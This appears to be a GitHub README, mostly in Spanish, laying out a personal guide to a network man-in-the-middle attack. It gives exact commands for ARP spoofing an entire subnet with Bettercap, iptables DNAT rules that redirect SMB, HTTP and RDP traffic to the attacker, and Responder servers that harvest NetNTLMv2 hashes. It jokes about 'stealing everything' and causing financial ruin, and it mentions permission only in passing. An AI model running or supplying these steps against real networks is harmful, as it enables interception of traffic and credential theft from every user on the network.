# Man-In-The-Mirror
My own guide of how to integrate famous tools like Responder and Bettercap to Steal everything, Kill everyone and cause total financial ruin.


⣿⣿⣿⣿⣿⣿⣿⡿⡛⠟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠨⡀⠄⠄⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠿⢁⠼⠊⣱⡃⠄⠈⠹⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡿⠛⡧⠁⡴⣦⣔⣶⣄⢠⠄⠄⠹⣿⣿⣿⣿⣿⣿⣿⣤⠭⠏⠙⢿⣿⣿⣿⣿⣿
⣿⡧⠠⠠⢠⣾⣾⣟⠝⠉⠉⠻⡒⡂⠄⠙⠻⣿⣿⣿⣿⣿⡪⠘⠄⠉⡄⢹⣿⣿⣿⣿
⣿⠃⠁⢐⣷⠉⠿⠐⠑⠠⠠⠄⣈⣿⣄⣱⣠⢻⣿⣿⣿⣿⣯⠷⠈⠉⢀⣾⣿⣿⣿⣿
⣿⣴⠤⣬⣭⣴⠂⠇⡔⠚⠍⠄⠄⠁⠘⢿⣷⢈⣿⣿⣿⣿⡧⠂⣠⠄⠸⡜⡿⣿⣿⣿
⣿⣇⠄⡙⣿⣷⣭⣷⠃⣠⠄⠄⡄⠄⠄⠄⢻⣿⣿⣿⣿⣿⣧⣁⣿⡄⠼⡿⣦⣬⣰⣿
⣿⣷⣥⣴⣿⣿⣿⣿⠷⠲⠄⢠⠄⡆⠄⠄⠄⡨⢿⣿⣿⣿⣿⣿⣎⠐⠄⠈⣙⣩⣿⣿
⣿⣿⣿⣿⣿⣿⢟⠕⠁⠈⢠⢃⢸⣿⣿⣶⡘⠑⠄⠸⣿⣿⣿⣿⣿⣦⡀⡉⢿⣧⣿⣿
⣿⣿⣿⣿⡿⠋⠄⠄⢀⠄⠐⢩⣿⣿⣿⣿⣦⡀⠄⠄⠉⠿⣿⣿⣿⣿⣿⣷⣨⣿⣿⣿
⣿⣿⣿⡟⠄⠄⠄⠄⠄⠋⢀⣼⣿⣿⣿⣿⣿⣿⣿⣶⣦⣀⢟⣻⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡆⠆⠄⠠⡀⡀⠄⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡿⡅⠄⠄⢀⡰⠂⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

~ Responder and Bettercap -- you could have 
    one without the other, but *why* would you want to...?

Bueno lo primero es que si bien este github pretende mas que todo servirme de guia personal, por si alguien quiere utilizar o lanzar este ataque aqui mencionado, es importante tener en cuenta que no podria ser muy util en un hackeo de verdad puesto que es extremadamente ruidoso y cualquier equipo decente de seguridad lo notaria (en realidad cualquier Admin TI puesto que cuando todos los servidores caen, o pierden conexion, es comun que los usuarios se empiecen a quejar). Por lo anterior en el caso de que sea un pentest posiblemente deberias pedir permiso antes de realizarlo.

Con lo anterior aclarado, seria ideal si quien lo usara no termina en la carcel por ruidoso o sin empleo por causar la ruina financiera a su cliente ;).

### Estructura
Actualmente no cuento con un grafico aunque podria ser de mucha ayuda, basicamente la estructura del ataque es la siguiente:

Primero todo el trafico de la red ya sea que iba dirigido a una maquina interna o externa, sera redirigido a tu pc o maquina que este utilizando y que este dentro de la red. Lo segundo sera redirigir todo el trafico que entra en tu maquina a los servicios falsos que hallaz montado en maquina o algun servidor, y por ultimo deberas disfrutar del buen farm. 
(Se que posiblemente no soy el primero ni el ultimo en realizar un ataque asi, simplemente es para recordar los comandos y tratar de hacer una guia que vaya a otro nivel por que por lo general solo veras guias de Responder y Bettercap usandose por separado y unicamente viendo el trafico, sin aprovechar todo el potencial de MiTM)

### Requisitos
Lo primero es haber logrado realizar un MiTM, para esto hay una gran variedad de herramientas y ataques como por ejemplo mitm6, arp spoofing, mitm usando una piña o algun dispositivo fisico, eviltwin, karma attacks... Tambien hay otros ataques que si bien no soy propiamente mitm en su definicion mas purista, actuan muy similar para nuestro proposito como por ejemplo DNS Spoofing, LLMNR Poisoning, MDNS Poisoning, NB-BTNS, y posiblemente muchos mas que se me han olvidado o que no conozco. Para nuestro caso por sencillez y lo comun que es encontrado usaremos ARP Spoofing.

Una vez el MiTM fue conseguido lo siguiente es decidir que vamos a hacer con todo el trafico que esta entrando en nuestro pc o servidor. Podriamos realizar una gran cantidad de integraciones y acciones, la gran mayoria de tutoriales unicamente llegan hasta el primer requisito o paso, y a lo mucho llegan a mencionar que hay muchas mas cosas que se podrian hacer pero no enseñan como se podrian hacerse. Como tal para efectos practios aqui unicamente voy a optar por redirigir el trafico a los servidores de Responder para obtener hashes NetNTLMv2 pero lo visto aqui perfectamente se podria trasladar a modulos de impacket como NTLMRelayx, Burpsuite, Paginas de phishing, etc...

Ya con el objetivo decidido el tercer paso es montar los servidores o servicios como se menciona en el paso 2 y por ultimo deberemos configurar nuestras reglas enrutamiento con iptables para conseguir redirigir todo el trafico a nuestros servicios maliciosos.

### Link Start
- Lo primero que vamos a realizar es la configuracion del ruteo atravez de ip tables, lo que vamos a hacer basicamente es redirigir todo el trafico que vaya para cualquier ip y que este pasando a travez de nuestra maquina y con destino los puertos 80, 139, 445, 3389... hacia nuestra ip en nuestros respectivos puertos 80, 139, 445, 3389...  (Recientemete desarrolle un script que es capaz de configurar de manera automatica las siguientes reglas).
```
# Simplemente ejecuta el script presente en este repo de la forma ./Man-in-The-Mirror.sh [INTERFAZ] [PUERTOS]
# Un ejemplo seria ./Man-in-The-Mirror.sh eth0 80,443,445,139,3389,25
# O configura las reglas de manera manual como se indica a continuacion

# Listar nuestras reglas de iptables en la tabla nat que es la que nos interesa para ver que no halla nada raro o en conflicto
sudo iptables -L -t nat

# Agregar las reglas de prerouting para redirigir todo paquete con destino al puerto 80, 139, 445, 3389 a nuestros puertos que despues seran abiertos con Responder
# Sea nuestra ip con responder 192.168.1.22
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.22:80
sudo iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 192.168.1.22:80
sudo iptables -t nat -A PREROUTING -p tcp --dport 139 -j DNAT --to-destination 192.168.1.22:139
sudo iptables -t nat -A PREROUTING -p tcp --dport 445 -j DNAT --to-destination 192.168.1.22:445
sudo iptables -t nat -A PREROUTING -p tcp --dport 3389 -j DNAT --to-destination 192.168.1.22:3389


# Ahora hay que activar el enmascaramiento para que el paquete pase a ser cosiderado propio y pueda ser modificado (O algo asi, mi especialidad no es iptables jejeje)
sudo iptables -t nat -A POSTROUTING -j MASQUERADE

```
Ya con el enrutamiento configurado sigue lo facil
- Vamos a subir los servidores de Responder, que van a estar escuchando en los puertos que anteriormente configuramos. Para esto simplemente vamos a lanzar el siguiente comando
```
# Sea nuestra interfaz conectada a la red eth0
sudo responder -I eth0 -A -v
```
Por ultimo ya con los servidores arriba lo unico que falta es conseguir el MiTM para esto vamos a usar Bettercap como antes habia mencionado
- Como tal vamos a utilizar el modulo de arp.spoof de Bettercap el cual realizara un arp spoofing redirigiendo todo el trafico del segmento seleccionado hacia nuestra ip
```
# Lo primero que vamos a realizar sera iniciar Bettercap
sudo bettercap

# Ahora deberemos validar las configuraciones y los modulos encendidos para eso podemos usar el comando help y help {modulo}
help
help arp.spoof

# Ahora encendemos los modulos secundarios que nos ayudaran a tener un mayor entendimiento de la red
net.probe on
net.sniff on

# Ahora toca ajustar el modulo de arp.spoof
set arp.spoof.internal true
set arp.spoof.fullduplex true

set arp.spoof.targets 192.168.1.0/24

# Por ultimo toca encender empezar el arp spoofing
arp.spoof on
```

Listo ya con esto deberiamos estar realizando el ataque, como se puede suponer esto se puede combinar con muchas otras herramietas y ataque como por ejemplo beef, burpsuite, sitios maliciosos, sitios de phishing, etc, etc
